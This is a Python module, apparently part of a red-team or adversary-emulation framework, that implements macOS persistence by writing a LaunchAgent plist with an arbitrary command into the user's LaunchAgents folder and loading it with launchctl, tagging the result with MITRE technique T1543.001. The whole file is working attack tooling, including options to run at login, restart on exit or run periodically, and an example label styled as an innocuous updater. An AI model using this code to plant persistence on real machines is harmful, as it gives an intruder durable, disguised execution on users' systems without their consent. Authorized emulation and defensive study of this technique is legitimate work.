import os
import platform
import subprocess
import shlex
import plistlib # For creating LaunchAgent plists
from typing import Dict, Any, Tuple, Optional, List
import logging
from pathlib import Path
from datetime import datetime

# Assume logger is passed or configured appropriately
logger = logging.getLogger(__name__)

class MacOSPersistence:
    """Handles macOS-specific persistence techniques."""

    def __init__(self, execute_command_func):
        """
        Initialize MacOSPersistence.

        Args:
            execute_command_func: A callable provided by the main Persistence class
                                  to execute commands.
        """
        self._execute_command = execute_command_func
        self.handler_map = {
            "launch_agent": self._handle_launch_agent,
            # Add LaunchDaemon later (requires root, different path)
        }
        logger.info("macOS Persistence handler initialized.")

    def establish(self, technique: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using a specific macOS technique."""
        handler = self.handler_map.get(technique)
        if handler:
            logger.info(f"Executing macOS persistence technique: {technique}")
            try:
                result = handler(details)
                # Ensure standard fields are present
                result["technique"] = technique
                result["timestamp"] = datetime.now().isoformat() # Import datetime if not already
                return result
            except Exception as e:
                logger.error(f"Error executing macOS persistence technique '{technique}': {e}", exc_info=True)
                return {"status": "failure", "technique": technique, "reason": str(e)}
        else:
            logger.warning(f"Unsupported macOS persistence technique requested: {technique}")
            return {"status": "failure", "technique": technique, "reason": f"Unsupported technique '{technique}' for macOS"}

    # --- Technique Handlers ---

    def _handle_launch_agent(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using macOS LaunchAgents."""
        # Parameters:
        # - label: Reverse domain notation recommended (e.g., com.bluefire.updater)
        # - command: The full command string to execute.
        # - run_at_load: Boolean (default: True) - run when agent is loaded/user logs in.
        # - keep_alive: Boolean (default: False) - restart if it exits.
        # - start_interval: Integer seconds (optional) - run periodically.
        # - plist_name: Optional specific name for the plist file (defaults based on label).
        # - force: Overwrite existing plist file (default: False).
        # - load_now: Attempt to load the agent using launchctl immediately (default: True).

        label = details.get("label")
        command_str = details.get("command")
        run_at_load = details.get("run_at_load", True)
        keep_alive = details.get("keep_alive", False)
        start_interval = details.get("start_interval")
        plist_name = details.get("plist_name")
        force = details.get("force", False)
        load_now = details.get("load_now", True)

        if not label or not command_str:
            return {"status": "failure", "reason": "Missing required parameters: 'label' and 'command'."}

        # Split command into program arguments list for ProgramArguments key
        try:
            program_arguments = shlex.split(command_str)
        except ValueError as e:
            return {"status": "failure", "reason": f"Could not parse command string: {e}"}

        # Construct plist dictionary
        plist_data = {
            "Label": label,
            "ProgramArguments": program_arguments,
            "RunAtLoad": run_at_load,
            "KeepAlive": keep_alive,
        }
        if start_interval is not None:
             try:
                  plist_data["StartInterval"] = int(start_interval)
             except ValueError:
                  return {"status": "failure", "reason": f"Invalid start_interval: {start_interval}. Must be integer seconds."}

        # Determine target path
        launch_agents_dir = Path.home() / "Library" / "LaunchAgents"
        if not plist_name:
            plist_name = f"{label}.plist"
        target_plist_path = launch_agents_dir / plist_name

        logger.info(f"Attempting to create LaunchAgent: {target_plist_path}")
        result_details = {
            "label": label,
            "command": command_str,
            "plist_path": str(target_plist_path),
            "plist_content": plist_data # Log the structure
        }
        status = "failure"
        reason = ""
        mitre_id = "T1543.001" # Create or Modify System Process: LaunchAgent
        mitre_name = "Create or Modify System Process: LaunchAgent"

        try:
            # Create directory if it doesn't exist
            launch_agents_dir.mkdir(parents=True, exist_ok=True)

            # Check if file exists
            if target_plist_path.exists() and not force:
                 reason = f"LaunchAgent file '{target_plist_path}' already exists and force=False."
                 logger.warning(reason)
                 return {"status": "skipped", "reason": reason, "details": result_details, "mitre_technique_id": mitre_id, "mitre_technique_name": mitre_name}

            # Write the plist file
            with open(target_plist_path, 'wb') as fp:
                plistlib.dump(plist_data, fp)
            logger.info(f"Successfully wrote LaunchAgent plist to {target_plist_path}")

            # Set appropriate permissions? (Usually 644 is fine for user agents)
            try:
                 os.chmod(target_plist_path, 0o644)
            except Exception as e_chmod:
                 logger.warning(f"Could not chmod {target_plist_path}: {e_chmod}")

            status = "success" # Mark as success once file is written
            reason = f"LaunchAgent plist created at {target_plist_path}."

            # Optionally load the agent
            if load_now:
                 logger.info(f"Attempting to load LaunchAgent: {target_plist_path}")
                 load_cmd = f"launchctl load -w {shlex.quote(str(target_plist_path))}"
                 exec_result = self._execute_command(load_cmd, capture_output=True)
                 result_details["load_command_executed"] = load_cmd
                 result_details["load_stdout"] = exec_result.get("stdout", "")
                 result_details["load_stderr"] = exec_result.get("stderr", "")
                 result_details["load_return_code"] = exec_result.get("return_code", -1)

                 if exec_result.get("return_code") == 0:
                      logger.info(f"Successfully loaded LaunchAgent {label}.")
                      reason += " Agent loaded successfully."
                 else:
                      load_error = exec_result.get("stderr", "Unknown error")
                      logger.error(f"Failed to load LaunchAgent {label}. RC={exec_result.get('return_code')}. Error: {load_error}")
                      reason += f" Warning: Failed to load agent immediately (RC={exec_result.get('return_code')}). Error: {load_error}. It might still load on next login."
                      # Don't change overall status to failure just because load failed

        except IOError as e:
             reason = f"IOError creating/writing LaunchAgent {target_plist_path}: {e}"
             logger.error(reason, exc_info=True)
             status = "failure"
        except Exception as e:
             reason = f"Unexpected error creating LaunchAgent: {e}"
             logger.error(reason, exc_info=True)
             status = "failure"

        result_details["final_reason"] = reason
        return {
            "status": status,
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "details": result_details
        }

    # --- Technique Handlers (Implement Later) ---

    # Example placeholder:
    # def _handle_launch_agent(self, details: Dict[str, Any]) -> Dict[str, Any]:
    #     logger.warning("LaunchAgent persistence technique not yet implemented.")
    #     return {"status": "not_implemented", "technique": "launch_agent", "reason": "Handler not implemented."} 